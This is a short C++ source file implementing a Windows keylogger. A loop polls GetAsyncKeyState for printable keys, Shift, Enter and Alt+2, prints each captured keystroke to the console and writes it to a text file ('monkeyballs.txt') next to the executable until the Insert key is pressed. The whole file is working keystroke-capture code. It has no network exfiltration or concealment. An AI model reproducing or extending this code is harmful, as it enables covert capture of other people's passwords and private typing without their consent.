#include "filesystem.h"
#include "keys.h"

bool KEY::isNumerical(char ch)
{
    return ch >= '0' && ch <= '9';
}

unsigned char KEY::keyPressed()
{
    for (int i = VK_OEM_PLUS; i < VK_OEM_PLUS+4; i++) {
        if (GetAsyncKeyState(i) & 1)
            return (i - 144);
    }
    for (char i = 0x20; i < 0x7e; ++i) {
        
        if (GetAsyncKeyState(i) & 1) {
            int shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0 ? 0x10 : 0;
            if (isNumerical(i))
                return i - shiftPressed;

            if(!shiftPressed)
                return (char)tolower(i);

            return i;
        }

    }
    if (GetAsyncKeyState(VK_MENU) < 0 && GetAsyncKeyState('2') & 1)
        return '@';

    else if (GetAsyncKeyState(VK_RETURN) & 1)
        return '\n';
    return 0;
}
void KEY::ReadKeys()
{
    std::fstream logger;

    if (!FS::F_OpenFile(&logger, FS::GetExePath() + "\\monkeyballs.txt", FS::fileopen::FILE_OUT))
        return;
    while (!false) {
        unsigned char key = keyPressed();
        if (key > 1) {
            std::cout << key;
            if (!FS::F_WriteToFile(&logger, key))
                std::cout << "can't write to file!\n";
        }
        else if (GetAsyncKeyState(VK_INSERT) & 1)
            break;
    }

    FS::F_CloseFile(&logger);
}
